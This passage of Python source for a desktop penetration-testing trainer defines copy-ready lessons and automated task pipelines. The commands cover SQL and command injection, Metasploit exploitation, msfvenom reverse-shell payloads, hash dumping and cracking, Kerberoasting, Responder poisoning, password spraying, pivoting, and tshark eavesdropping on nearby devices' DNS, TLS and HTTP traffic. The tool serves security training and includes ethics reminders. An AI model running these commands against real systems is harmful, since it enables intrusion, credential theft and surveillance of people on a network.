             "watch": "dnsrecon's brute mode is noisy — keep it out of passive engagements."},
        ],
        "analysis": [
            "Test every discovered subdomain — forgotten staging/dev boxes are the classic breach path.",
            "Wildcard + certificate transparency diff often reveals internal hostnames (vpn., admin., jira.).",
        ],
    },
    {
        "name": "D — Host Discovery",
        "goal": "Find which IPs are actually alive before wasting time port-scanning dead hosts.",
        "tools": ["nmap", "arp-scan"],
        "steps": [
            {"title": "ICMP + SYN ping sweep",
             "cmd": "nmap -sn -PS22,80,443 <range> -oA live",
             "expect": "A short list of 'Host is up' lines with MAC vendor on LAN.",
             "watch": "No reply ≠ dead. Firewalls drop ICMP; the -PS probes cover that — trust them over ping."},
            {"title": "Layer-2 sweep on your own LAN",
             "cmd": "arp-scan --localnet",
             "expect": "IP + MAC + vendor for every live host on your segment.",
             "watch": "Only works on the local broadcast domain — useless across routed networks."},
        ],
        "analysis": [
            "Save output with -oA so Scan tab / reports can diff runs over time.",
            "New hosts appearing between sweeps = DHCP churn or an attacker — worth a note in the report.",
        ],
    },
    {
        "name": "E — Port Scanning",
        "goal": "Enumerate every open TCP port and the service behind it.",
        "tools": ["nmap"],
        "steps": [
            {"title": "Full TCP connect sweep with versions",
             "cmd": "nmap -sV -sC -p- -T4 <target> -oA full",
             "expect": "All 65535 ports, service + version banners, default scripts output.",
             "watch": "Long run; -T4 can trip IDS. For stealthy scopes use -T2 and top 1000 ports."},
            {"title": "UDP top services (slow but needed)",
             "cmd": "nmap -sU --top-ports 50 <target> -oA udp",
             "expect": "DNS/SNMP/NTP/etc open or 'open|filtered'.",
             "watch": "'open|filtered' means no reply — verify manually before calling it open."},
        ],
        "analysis": [
            "Map versions to searchsploit IMMEDIATELY — that's the bridge from Recon to Exploit.",
            "Unexpected high ports (3389 on Linux, 22 on Windows) hint at tunnels or misconfig.",
        ],
    },
    {
        "name": "F — Vuln Scanning",
        "goal": "Turn service versions into candidate vulnerabilities with evidence.",
        "tools": ["nmap", "searchsploit", "nikto"],
        "steps": [
            {"title": "Nmap vuln scripts",
             "cmd": "nmap -sV --script vuln <target> -oA vuln",
             "expect": "Script output tagged VULNERABLE / Likely VULNERABLE per CVE.",
             "watch": "Script results are hints, not proof — confirm before reporting as critical."},
            {"title": "Match versions to Exploit-DB",
             "cmd": "searchsploit <product> <version>",
             "expect": "Public exploits with EDB codes matching your fingerprinted version.",
             "watch": "Check the exploit's platform and exact version range — 1.2.3 vs 1.2.3.1 matters."},
            {"title": "Web server baseline scan",
             "cmd": "nikto -h http://<target>",
             "expect": "Dangerous files, outdated server software, missing headers.",
             "watch": "Nikto is noisy and has false positives — treat output as a checklist to verify."},
        ],
        "analysis": [
            "Every 'VULNERABLE' needs manual confirmation: version string, banner, or safe PoC.",
            "Prioritize by CVSS + reachability: an unauth RCE on internet-facing beats an auth'd LPE.",
        ],
    },
    {
        "name": "G — Web Fingerprint",
        "goal": "Identify the exact CMS, framework, server and technologies running the site.",
        "tools": ["whatweb", "curl"],
        "steps": [
            {"title": "Aggressive fingerprint",
             "cmd": "whatweb -v https://<target>",
             "expect": "CMS, versions, IP, headers, plugins, JS libs — with confidence levels.",
             "watch": "CDNs (Cloudflare) fingerprint as the CDN, not the origin — find the origin IP separately."},
            {"title": "Header & cookie inspection",
             "cmd": "curl -sI https://<target>",
             "expect": "Server, X-Powered-By, Set-Cookie flags, security headers.",
             "watch": "Missing HSTS/CSP/X-Frame-Options and cookies without HttpOnly/Secure are findings."},
        ],
        "analysis": [
            "Old WordPress/Drupal/Joomla version -> searchsploit next.",
            "Stack leaks (X-Powered-By: PHP/5.6) = outdated runtime, usually reportable on its own.",
        ],
    },
    {
        "name": "H — Content Discovery",
        "goal": "Find hidden paths, panels, backups and files the site doesn't link to.",
        "tools": ["ffuf", "gobuster"],
        "steps": [
            {"title": "Directory brute force",
             "cmd": "ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,403 -o ffuf.json -of json",
             "expect": "JSON list of discovered paths with status codes and sizes.",
             "watch": "Same-size responses = soft-404s. Filter them with -fs or you'll chase ghosts."},
            {"title": "Backup / source leak hunt",
             "cmd": "ffuf -u http://<target>/FUZZ.bak -w /usr/share/wordlists/dirb/common.txt",
             "expect": "config.bak, index.php~, .git leftovers etc.",
             "watch": "A single backup file with DB credentials is usually Critical — grab and document it."},
        ],
        "analysis": [
            "403 on /admin often means 'exists, blocked by rule' — try verb tampering or IP bypass notes.",
            "Compare response SIZES, not just codes — that's where real content hides.",
        ],
    },
    {
        "name": "I — SQL Injection",
        "goal": "Prove a parameter executes attacker-controlled SQL, then show impact.",
        "tools": ["sqlmap"],
        "steps": [
            {"title": "Baseline detection",
             "cmd": "sqlmap -u 'http://<target>/page.php?id=1' --batch --dbs",
             "expect": "Parameter marked injectable + list of database names.",
             "watch": "'injectable' via time-based only is slower/noisier — note the technique used."},
            {"title": "Deep test on a POST/request file",
             "cmd": "sqlmap -r request.txt --batch --level=5 --risk=3 --os-shell",
             "expect": "Higher-risk tests, possible OS shell if DB user is privileged.",
             "watch": "risk=3 can modify data — never on production without written approval."},
        ],
        "analysis": [
            "Report impact, not just the vuln: 'read all user hashes' beats 'boolean-based blind'.",
            "Take screenshots of sqlmap's extracted data as evidence — output scrolls away.",
        ],
    },
    {
        "name": "J — Command Injection",
        "goal": "Find where user input reaches a shell and execute your own commands.",
        "tools": ["commix", "curl"],
        "steps": [
            {"title": "Automated detection",
             "cmd": "commix -u 'http://<target>/page.php?cmd=ping' --batch",
             "expect": "Injectable parameter confirmed, tested payloads listed.",
             "watch": "commix can be aggressive — review the payload log for anything destructive."},
            {"title": "Manual proof",
             "cmd": "curl -s 'http://<target>/page.php?cmd=ping;id'",
             "expect": "uid=33(www-data) style output embedded in the response.",
             "watch": "Time-based proof (ping -c 10) when output is filtered — measure the delay."},
        ],
        "analysis": [
            "Show RCE evidence with 'id' / 'whoami', never with destructive commands.",
            "Blind injection still = Critical if you can exfiltrate data (DNS, time, out-of-band).",
        ],
    },
    {
        "name": "K — CMS & WordPress",
        "goal": "Enumerate a CMS for vulnerable plugins, themes, users and weak logins.",
        "tools": ["wpscan"],
        "steps": [
            {"title": "Full WP enumeration",
             "cmd": "wpscan --url http://<target> --enumerate u,vp,vt",
             "expect": "Usernames by ID, vulnerable plugins/themes with version numbers.",
             "watch": "Vulnerable plugin requires it to be reachable — check the path actually exists."},
            {"title": "Password audit with found users",
             "cmd": "wpscan --url http://<target> -U admin -P /usr/share/wordlists/rockyou.txt.gz",
             "expect": "Valid credential found or 'no valid credentials'.",
             "watch": "Lockouts — start with a tiny password list before rockyou, or you'll brick the account."},
        ],
        "analysis": [
            "WP version in readme.html often lies; trust the generator meta + wpscan's detection.",
            "Admin username enumeration alone is a Low finding worth reporting.",
        ],
    },
    {
        "name": "L — SMB & Windows Enum",
        "goal": "Extract users, shares, policies and sessions from Windows hosts.",
        "tools": ["netexec", "smbclient", "enum4linux"],
        "steps": [
            {"title": "Share & policy sweep",
             "cmd": "netexec smb <target> --shares",
             "expect": "Share names with READ/WRITE flags, signing status, host info.",
             "watch": "SIGNING:False + writable share = relay attack path — flag it."},
            {"title": "Browse a share anonymously",
             "cmd": "smbclient -L //<target> -N",
             "expect": "Share list with type/description.",
             "watch": "ADMIN$/C$ mean admin rights already exist somewhere; note but don't touch unauth."},
            {"title": "Full legacy enum",
             "cmd": "enum4linux -a <target>",
             "expect": "Users (via RID cycling), groups, shares, OS info.",
             "watch": "Null sessions may return partial results — verify user lists against other sources."},
        ],
        "analysis": [
            "Passwords in readable shares are the single most common Critical in student labs.",
            "SID/User RID cycling leaks valid usernames — feed them into password attacks next.",
        ],
    },
    {
        "name": "M — Active Directory",
        "goal": "Map the domain: trusts, users, groups, and paths to Domain Admin.",
        "tools": ["ldapdomaindump", "bloodhound-python", "certipy-ad"],
        "steps": [
            {"title": "LDAP dump of the domain",
             "cmd": "ldapdomaindump -u '<domain>/<user>' -p <password> <target> -o ldap_dump",
             "expect": "HTML/JSON files of users, groups, policies in ldap_dump/.",
             "watch": "Password policy in domain policy JSON tells you lockout thresholds before brute-forcing."},
            {"title": "BloodHound collection",
             "cmd": "bloodhound-python -d <domain> -u <user> -p <password> -ns <target> -c All",
             "expect": "BloodHound JSON files (users, groups, sessions, ACLs) ready for ingestion.",
             "watch": "Sessions expire fast — collect close to your analysis time or paths go stale."},
            {"title": "Certificate template audit",
             "cmd": "certipy-ad find -u <user>@<domain> -p <password> -vulnerable",
             "expect": "Vulnerable AD CS templates (ESC1..ESC8) listed.",
             "watch": "'SubCA' or template allowing client auth + request = domain compromise path. Critical."},
        ],
        "analysis": [
            "Shortest path to Domain Admin in BloodHound IS the report's executive summary.",
            "Always re-verify graph edges with netexec before claiming a path works.",
        ],
    },
    {
        "name": "N — Credential Attacks",
        "goal": "Test login services against wordlists — legally, and without locking accounts.",
        "tools": ["hydra", "medusa"],
        "steps": [
            {"title": "Single-user SSH spray",
             "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz <target> ssh",
             "expect": "One 'login found' line with the password, or all attempts failed.",
             "watch": "rockyou against SSH will lock accounts / get you banned — use a 100-line list first."},
            {"title": "Parallel multi-protocol test",
             "cmd": "medusa -h <target> -u admin -P /usr/share/wordlists/rockyou.txt.gz -M ssh",
             "expect": "Valid credential or per-attempt failure log.",
             "watch": "medusa threads faster than hydra — lower -t or you'll DoS the service."},
        ],
        "analysis": [
            "Always report WHICH service, WHICH account, and how many attempts it took.",
            "Found password reused elsewhere? Flag credential stuffing risk — often the real finding.",
        ],
    },
    {
        "name": "O — Hash Cracking",
        "goal": "Turn captured hashes into plaintext passwords offline.",
        "tools": ["john", "hashcat"],
        "steps": [
            {"title": "Identify the format first",
             "cmd": "john --format=list | head -30 && hashcat --example-hashes | head",
             "expect": "Supported formats — match your hash (NTLM=1000, MD5=0, sha512crypt=1800).",
             "watch": "Cracking with the wrong --format wastes hours and silently fails."},
            {"title": "Wordlist pass with rules",
             "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt.gz --rules hash.txt",
             "expect": "Cracked passwords listed: 'admin:password123'.",
             "watch": "John stops on first success per hash — --show displays all recovered."},
            {"title": "GPU accelerated NTLM",
             "cmd": "hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt.gz",
             "expect": "Status screen; cracked hashes in hashcat.potfile.",
             "watch": "No GPU? hashcat on CPU is slower than john — pick the right tool."},
        ],
        "analysis": [
            "Report cracked creds as 'domain\\user:password' — context matters more than the hash.",
            "Uncracked admin hashes still matter: relay/Pass-the-Hash doesn't need plaintext.",
        ],
    },
    {
        "name": "P — Hash Capture",
        "goal": "Capture network authentication material on your segment with Responder.",
        "tools": ["responder"],
        "steps": [
            {"title": "Poison LLMNR/NBT-NS",
             "cmd": "responder -I <iface> -wrf",
             "expect": "Welcome banner, then '[NTLMv2]' capture lines with user, challenge, response.",
             "watch": "Only run on segments you own — poisoning production networks breaks logins."},
            {"title": "Crack the capture",
             "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt.gz Responder-*.txt",
             "expect": "user::domain:challenge:response:plaintext-password.",
             "watch": "NTLMv2 cracking is slow-ish; let rockyou run fully before going to rules/masks."},
        ],
        "analysis": [
            "Captured hash = passwords policy weakness; cracked = critical credential exposure.",
            "Pair with ntlmrelayx paths in the report for full attack narrative.",
        ],
    },
    {
        "name": "Q — Exploitation",
        "goal": "Gain initial access using a verified vulnerability — safely.",
        "tools": ["msfconsole", "searchsploit"],
        "steps": [
            {"title": "Find the module",
             "cmd": "msfconsole -q -x 'search vsftpd; exit'",
             "expect": "Exploit modules ranked by rank (excellent/great) for that service.",
             "watch": "Rank + target version match = safe bet. Random exploits crash services."},
            {"title": "Configure and run",
             "cmd": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <target>; run; sleep 10; exit'",
             "expect": "Meterpreter session opened / command shell on the target.",
             "watch": "No session? Check reachability, LHOST, and whether the service actually crashed."},
            {"title": "Verify your foothold",
             "cmd": "searchsploit -m <edb_id>",
             "expect": "Exploit copied locally for review before use.",
             "watch": "READ the exploit first — student code from the internet can be malicious."},
        ],
        "analysis": [
            "Screenshot the session banner: that's your proof of exploitation for the report.",
            "If the service dies, restart it in the lab and note instability as a risk finding.",
        ],
    },
    {
        "name": "R — Payloads",
        "goal": "Generate platform-correct payloads and catch the callback.",
        "tools": ["msfvenom", "socat"],
        "steps": [
            {"title": "Linux reverse shell",
             "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf",
             "expect": "elf file written; printed size + encoding info.",
             "watch": "LHOST must be YOUR reachable IP — a wrong LHOST = dead callback."},
            {"title": "Windows executable",
             "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o shell.exe",
             "expect": "exe written; AV may flag it instantly in labs.",
             "watch": "Meterpreter needs handler; raw shell doesn't. Match payload to your listener."},
            {"title": "Catch the shell",
             "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork STDOUT",
             "expect": "Connection line, then a shell prompt when the payload runs.",
             "watch": "Firewall/DNS callbacks are common lab failures — confirm listener port is open."},
        ],
        "analysis": [
            "Always use a listener on a port you documented in scope.",
            "Save msfvenom output (sizes/encodings) in the report for reproducibility.",
        ],
    },
    {
        "name": "S — Post Exploitation",
        "goal": "Prove impact: what can this foothold actually reach?",
        "tools": ["evil-winrm", "impacket-secretsdump", "impacket-psexec"],
        "steps": [
            {"title": "Stable Windows shell",
             "cmd": "evil-winrm -i <target> -u <user> -p <password>",
             "expect": "*Evil-WinRM* banner and PS C:\\Users\\...> prompt.",
             "watch": "WinRM (5985/5986) must be open — check nmap output from the Scan phase."},
            {"title": "Dump domain hashes",
             "cmd": "impacket-secretsdump <domain>/<user>:<password>@<target>",
             "expect": "Local + domain NTLM hashes, including Administrator:RID:hash lines.",
             "watch": "Needs admin/DA rights; 'STATUS_ACCESS_DENIED' = privilege too low, escalate first."},
            {"title": "Pass-the-hash shell",
             "cmd": "impacket-psexec <domain>/<user>:<hash>@<target>",
             "expect": "SYSTEM shell via SMB service creation.",
             "watch": "Hash replay works only where SMB signing is off or you're already privileged."},
        ],
        "analysis": [
            "Dumping DA hashes = game over; document it as full domain compromise.",
            "Always note which account you used and its privilege level — impact scales with it.",
        ],
    },
    {
        "name": "T — Kerberos Attacks",
        "goal": "Abuse Kerberos: roast service accounts and request forged tickets.",
        "tools": ["impacket-GetUserSPNs", "hashcat"],
        "steps": [
            {"title": "Kerberoast enumeration",
             "cmd": "impacket-GetUserSPNs <domain>/<user>:<password>@<target> -request -outputfile roast.hashes",
             "expect": "SPN accounts + TGS tickets saved as $krb5tgs$ hashes.",
             "watch": "Any domain user can request these — the vuln is weak service-account passwords."},
            {"title": "Crack the TGS",
             "cmd": "hashcat -m 13100 roast.hashes /usr/share/wordlists/rockyou.txt.gz",
             "expect": "Service account plaintext password.",
             "watch": "Service accounts rarely rotate passwords — cracked one likely = DA reused somewhere."},
        ],
        "analysis": [
            "A cracked svc account with admin rights is your path to Domain Admin — show the chain.",
            "AS-REP roastable users (no pre-auth) are equally reportable: -asrep option to check.",
        ],
    },
    {
        "name": "U — Privilege Escalation",
        "goal": "From low-priv shell to root/admin.",
        "tools": ["sudo", "searchsploit"],
        "steps": [
            {"title": "Linux: quick wins",
             "cmd": "sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /etc/crontab",
             "expect": "Allowed sudo commands, SUID binaries, scheduled jobs.",
             "watch": "GTFOBins: any sudo/SUID binary = shell. This is the #1 privesc path."},
            {"title": "Windows: token & service checks",
             "cmd": "whoami /priv; whoami /groups; net localgroup administrators",
             "expect": "Privileges (SeImpersonate = Potato attacks), group memberships.",
             "watch": "'Backup operators' or unquoted service paths = silent root paths."},
            {"title": "Match to public privesc",
             "cmd": "searchsploit linux kernel 5.15 privilege escalation",
             "expect": "Kernel exploits matching your version.",
             "watch": "Kernel exploits crash machines — only in labs, never first choice."},
        ],
        "analysis": [
            "Document the exact escalation chain (service misconfig > sudo > root), not just the end state.",
            "Kernel version ≠ exploitable: confirm CONFIG options / mitigations before claiming.",
        ],
    },
    {
        "name": "V — Pivoting",
        "goal": "Reach networks behind the compromised host.",
        "tools": ["chisel", "proxychains4", "socat"],
        "steps": [
            {"title": "Start the chisel server (you)",
             "cmd": "chisel server --reverse --port 8080",
             "expect": "Listening on 8080, awaiting client connections.",
             "watch": "Your listener must be reachable FROM the target — host firewalls block callbacks."},
            {"title": "Client on the compromised host",
             "cmd": "chisel client <your_ip>:8080 R:socks",
             "expect": "SOCKS proxy established on 1080.",
             "watch": "One wrong IP = silent failure; verify with ss -lntp on your side."},
            {"title": "Scan the internal net through it",
             "cmd": "proxychains4 nmap -sT -Pn <internal_range>",
             "expect": "TCP-connect scans (slower, no SYN) via the proxy.",
             "watch": "proxychains only proxies TCP; UDP/ICMP need other tunnels."},
        ],
        "analysis": [
            "In the report: diagram the pivot path (you -> hostA -> internal net).",
            "Internal-only vulns found via pivot are still in scope only if scope says so — re-check.",
        ],
    },
    {
        "name": "W — Evidence & Logging",
        "goal": "Capture proof for every finding — you won't remember it at report time.",
        "tools": ["tee", "nmap", "script"],
        "steps": [
            {"title": "Every scan saved to disk",
             "cmd": "nmap -sV <target> -oA scans/nmap_$(date +%F_%H%M)",
             "expect": ".nmap/.gnmap/.xml triplet with timestamp.",
             "watch": "Undated evidence is worthless in a dispute — always timestamp."},
            {"title": "Terminal session recording",
             "cmd": "script -a logs/session_$(date +%F_%H%M).log",
             "expect": "Typescript file capturing all subsequent terminal I/O.",
             "watch": "script logs passwords too — protect the file like the loot."},
        ],
        "analysis": [
            "One folder per finding: command, output, screenshot. Report writing becomes assembly.",
            "Redact third-party PII from evidence before sharing the report.",
        ],
    },
    {
        "name": "X — Fix Verification",
        "goal": "Re-test after remediation and prove the fix holds.",
        "tools": ["nmap", "sqlmap", "ffuf"],
        "steps": [
            {"title": "Re-run the original proof",
             "cmd": "nmap -sV <target> -oA retest/nmap_after",
             "expect": "Previously open vulnerable port/version now closed or upgraded.",
             "watch": "Version changed but still vulnerable = partial fix — report as open."},
            {"title": "Confirm with the same tool+flags",
             "cmd": "sqlmap -u 'http://<target>/page.php?id=1' --batch --level=3",
             "expect": "'not injectable' where the original said injectable.",
             "watch": "Weaker flags = false negatives. Re-test with the EXACT original command."},
        ],
        "analysis": [
            "Re-test evidence closes the engagement cleanly — old screenshot + new screenshot pair.",
            "Partial fixes are the norm; document what remains open and residual risk.",
        ],
    },
    {
        "name": "Y — Reporting",
        "goal": "Turn technical findings into something management can act on.",
        "tools": ["notes"],
        "steps": [
            {"title": "Severity model",
             "cmd": "echo 'CRITICAL=9-10 HIGH=7-8 MEDIUM=4-6 LOW=1-3 INFO=0' > severity.txt",
             "expect": "A consistent CVSS-aligned scale your whole team uses.",
             "watch": "Never inflate severity — one wrong Critical destroys credibility."},
            {"title": "Finding template",
             "cmd": "printf 'TITLE:\\nSEVERITY:\\nASSET:\\nSTEP-BY-STEP:\\nEVIDENCE:\\nIMPACT:\\nREMEDIATION:\\n' > finding.md",
             "expect": "Skeleton for every finding you write.",
             "watch": "Without remediation advice a finding is a complaint, not a report."},
        ],
        "analysis": [
            "Executive summary first: asset, worst finding, business impact, top 3 fixes.",
            "Every claim needs linked evidence — reviewers WILL spot unsupported statements.",
        ],
    },
    {
        "name": "Z — Ethics & Law",
        "goal": "Stay on the right side of CFAA / local law while learning.",
        "tools": ["notes"],
        "steps": [
            {"title": "The three rules",
             "cmd": "echo '1) OWN or PERMISSION  2) SCOPE ALWAYS  3) NO DATA THEFT' > rules.txt",
             "expect": "A reminder you read before every session.",
             "watch": "Accessing real user data 'just to look' is a crime, even on a target you own."},
            {"title": "Safe practice targets",
             "cmd": "echo 'tryhackme.com  hackthebox.com  dvwa  metasploitable' > lab_targets.txt",
             "expect": "Legal environments where you can go full depth.",
             "watch": "If it's on the public internet and not yours — don't. Ever."},
        ],
        "analysis": [
            "Your notes will be evidence against you if misused — keep the same rigor as loot files.",
            "When unsure: stop, ask the owner, get it in writing. That's the professional answer.",
        ],
    },
]


class CopyButton(QPushButton):
    """Ghost button that copies its associated text to the clipboard."""

    def __init__(self, text, label=None, parent=None):
        super().__init__(label or "COPY", parent)
        self.setObjectName("ghost")
        self._text = text
        self.clicked.connect(self._copy)

    def _copy(self):
        QApplication.clipboard().setText(self._text)
        flash = self.text() if self.text() != "COPIED" else "COPY"
        self.setText("COPIED")
        if flash:
            QTimer.singleShot(1200, lambda: self.setText(flash))


class LearnStepFrame(QFrame):
    """One learning step: title + command with one-click copy, expect, watch-for."""

    def __init__(self, step):
        super().__init__()
        self.setObjectName("step")
        lay = QVBoxLayout(self)
        lay.setContentsMargins(14, 12, 14, 12)
        lay.setSpacing(7)

        head = QHBoxLayout()
        head.setSpacing(8)
        title = QLabel(step["title"].upper())
        title.setObjectName("steptitle")
        head.addWidget(title)
        head.addStretch(1)
        head.addWidget(CopyButton(step["cmd"]))
        lay.addLayout(head)

        cmd = QLabel(step["cmd"])
        cmd.setObjectName("cmdline")
        cmd.setWordWrap(True)
        lay.addWidget(cmd)

        exp = QLabel("EXPECT  //  " + step["expect"])
        exp.setObjectName("expect")
        exp.setWordWrap(True)
        lay.addWidget(exp)

        watch = QLabel("WATCH  //  " + step["watch"])
        watch.setObjectName("watch")
        watch.setWordWrap(True)
        lay.addWidget(watch)


class LearnModulePage(QScrollArea):
    """Full A-Z module: goal, tools, copy-ready steps, deep-dive analysis."""

    def __init__(self, mod):
        super().__init__()
        self.setWidgetResizable(True)
        self.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)

        content = QWidget()
        lay = QVBoxLayout(content)
        lay.setContentsMargins(0, 0, 8, 0)
        lay.setSpacing(12)

        goal = QLabel(mod["goal"])
        goal.setObjectName("goal")
        goal.setWordWrap(True)
        lay.addWidget(goal)

        tools_row = QHBoxLayout()
        tools_row.setSpacing(6)
        tl = QLabel("TOOLS:")
        tl.setObjectName("section")
        tools_row.addWidget(tl)
        for t in mod["tools"]:
            chip = QLabel(t)
            chip.setObjectName("chip")
            tools_row.addWidget(chip)
        tools_row.addStretch(1)
        lay.addLayout(tools_row)

        sec = QLabel("STEPS  //  click COPY on any command")
        sec.setObjectName("section")
        lay.addWidget(sec)

        for step in mod["steps"]:
            lay.addWidget(LearnStepFrame(step))

        an = QLabel("DEEP DIVE  //  what to look for in the results")
        an.setObjectName("section")
        lay.addWidget(an)

        for point in mod["analysis"]:
            bullet = QLabel("—  " + point)
            bullet.setObjectName("goal")
            bullet.setStyleSheet(f"color: {NEON2}; font-size: 13px;")
            bullet.setWordWrap(True)
            lay.addWidget(bullet)

        lay.addStretch(1)
        self.setWidget(content)


class LearnPane(QWidget):
    """Sidebar list of A-Z modules + stacked module pages."""

    def __init__(self, log, report):
        super().__init__()
        self.log = log
        self.report = report

        lay = QHBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(14)

        self.listw = QListWidget()
        self.listw.setFixedWidth(210)
        for mod in LEARN_MODULES:
            item = QListWidgetItem(mod["name"])
            item.setToolTip(mod["goal"])
            self.listw.addItem(item)
        self.listw.currentRowChanged.connect(self._show)
        lay.addWidget(self.listw)

        self.stack = QStackedWidget()
        for mod in LEARN_MODULES:
            self.stack.addWidget(LearnModulePage(mod))
        lay.addWidget(self.stack, 1)

        self.listw.setCurrentRow(0)

    def _show(self, row):
        if row >= 0:
            self.stack.setCurrentIndex(row)


CROW_ROLES = {
    "recon": {
        "blurb": "silent discovery — hosts, ports, services, attack surface. never touches the target.",
        "tasks": [
            ("dns records", "dig {target} ANY +noall +answer"),
            ("whois ownership", "whois {target}"),
            ("live host check", "nmap -sn -PS22,80,443 {target} -oA crow/{name}_live"),
            ("top-1000 port + service scan", "nmap -sV -T4 --top-ports 1000 {target} -oA crow/{name}_ports"),
            ("web fingerprint", "whatweb {target}"),
            ("directory discovery", "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/small.txt -mc 200,301,302,403 -t 50 -s -o crow/{name}_ffuf.json -of json"),
            ("smb / netbios probe", "netexec smb {target} --shares"),
        ],
    },
    "pentest": {
        "blurb": "active testing — vuln checks, exposure, credential tests. authorized targets only.",
        "tasks": [
            ("service fingerprint", "nmap -sV -sC -T4 --top-ports 1000 {target} -oA crow/{name}_svc"),
            ("vuln scripts", "nmap -sV --script vuln --top-ports 200 {target} -oA crow/{name}_vuln"),
            ("web fingerprint", "whatweb {target}"),
            ("directory discovery", "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 100 -s -o crow/{name}_ffuf.json -of json"),
            ("nikto baseline", "nikto -h {target} -nointeractive -maxtime 120s"),
            ("share exposure", "netexec smb {target} --shares"),
            ("ssh credential test", "hydra -l admin -P /usr/share/wordlists/fasttrack.txt -t 4 -f {target} ssh"),
        ],
    },
    "sniff": {
        "blurb": "passive eavesdrop — watches the local segment for casting/service announcements, "
                 "DNS and TLS SNI. transmits nothing. sees what devices broadcast, not encrypted screen content.",
        "tasks": [
            ("ensure mdns daemon is up", "sudo -n systemctl start avahi-daemon"),
            ("arp sweep — find the phone", "sudo -n arp-scan --localnet"),
            ("mdns service browse (cast/airplay/spotify)", "avahi-browse -a -t -r"),
            ("phone service scan", "nmap -Pn -sV --top-ports 100 {target} -oA {outdir}/{name}_phone"),
            ("listen: casting & service announcements (45s)", "tshark -i {iface} -a duration:45 -l -Y 'mdns or ssdp or llmnr' -T fields -e frame.time -e ip.src -e _ws.col.Protocol -e _ws.col.Info"),
            ("eavesdrop: cast/dial http control (40s)", "tshark -i {iface} -a duration:40 -l -Y 'http' -T fields -e frame.time -e ip.src -e http.host -e http.request.uri -e http.file_data"),
            ("listen: dns queries on the wire (30s)", "tshark -i {iface} -a duration:30 -l -Y 'dns' -T fields -e frame.time -e ip.src -e dns.qry.name"),
            ("listen: tls sni — who everyone talks to (30s)", "tshark -i {iface} -a duration:30 -l -Y 'tls.handshake.extensions_server_name' -T fields -e frame.time -e ip.src -e tls.handshake.extensions_server_name"),
            ("save evidence pcap (60s)", "tshark -i {iface} -a duration:60 -w {outdir}/{name}_wire.pcap"),
        ],
    },
    "eyes": {
        "blurb": "MAXIMUM coverage — full-segment inventory, service probe, cast eavesdrop, DNS/TLS watch "
                 "and a deep capture, then a color-coded triage verdict with the decision to act on.",
        "tasks": [
            ("ensure mdns daemon is up", "sudo -n systemctl start avahi-daemon"),
            ("arp sweep — who is actually here", "sudo -n arp-scan --localnet"),
            ("network inventory — live hosts", "nmap -sn -PR -PS22,80,443,5353 {target} -oA {outdir}/{name}_eyes_live"),
            ("full-segment service probe", "nmap -Pn -sV --top-ports 200 {target} -oA {outdir}/{name}_eyes_ports"),
            ("casting/named services (mdns browse)", "avahi-browse -a -t -r"),
            ("listen: casting & service announcements (45s)", "tshark -i {iface} -a duration:45 -l -Y 'mdns or ssdp or llmnr' -T fields -e frame.time -e ip.src -e _ws.col.Protocol -e _ws.col.Info"),
            ("eavesdrop: cast/dial http control (40s)", "tshark -i {iface} -a duration:40 -l -Y 'http' -T fields -e frame.time -e ip.src -e http.host -e http.request.uri -e http.file_data"),
            ("listen: dns queries on the wire (60s)", "tshark -i {iface} -a duration:60 -l -Y 'dns' -T fields -e frame.time -e ip.src -e dns.qry.name"),
            ("listen: tls sni — who everyone talks to (60s)", "tshark -i {iface} -a duration:60 -l -Y 'tls.handshake.extensions_server_name' -T fields -e frame.time -e ip.src -e tls.handshake.extensions_server_name"),
            ("deep capture — full-segment pcap (90s)", "tshark -i {iface} -a duration:90 -w {outdir}/{name}_eyes_wire.pcap"),
        ],
    },
    "custom": {
        "blurb": "runs exactly the raw command you typed — for one-off tools raven has no recipe for.",
        "tasks": [],
    },
    "remedy": {
        "blurb": "response crow — dispatched to treat a flagged finding: confirm it, attribute it, and decide.",
        "tasks": [],
    },
}

TOOL_COMMANDS = {}
for _t in list(RECON_TOOLS) + list(PENTEST_TOOLS):
    TOOL_COMMANDS.setdefault(_t["name"].lower(), _t["cmd"])

TASK_PENDING = "pending"
TASK_RUNNING = "running"
TASK_DONE = "done"
TASK_FAILED = "failed"
TASK_STOPPED = "stopped"


class CrowView(QWidget):
    """One spawned crow: pipeline tasks, live output, autopilot controls."""

    STUDENT_MIN_PER_TASK = 3

    def __init__(self, crow, log, request_run, request_stop, request_custom=None, request_remedy=None, escalate=None):
        super().__init__()
        self.crow = crow
        self.log = log
        self.request_run = request_run
        self.request_stop = request_stop
        self.request_custom = request_custom
        self.request_remedy = request_remedy
        self.escalate_cb = escalate
        self.started_at = None

        self.tick = QTimer(self)
        self.tick.setInterval(1000)
        self.tick.timeout.connect(self._refresh_elapsed)

        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(10)

        head = QHBoxLayout()
        head.setSpacing(10)
        name = QLabel(crow["name"].upper())
        name.setObjectName("toolname")
        head.addWidget(name)
        chip = QLabel(crow["role"].upper())
        chip.setObjectName("chip")
        head.addWidget(chip)
        tgt = QLabel(crow["target"])
        tgt.setStyleSheet(f"color: {MUTED}; font-size: 12px;")
        head.addWidget(tgt)
        head.addStretch(1)
        self.state_lbl = QLabel("IDLE")
        self.state_lbl.setStyleSheet(
            f"color: {MUTED}; font-size: 11px; letter-spacing: 2px; border: 1px solid {EDGE}; padding: 3px 10px;"
        )
        head.addWidget(self.state_lbl)
        self.elapsed_lbl = QLabel("00:00")
        self.elapsed_lbl.setStyleSheet(
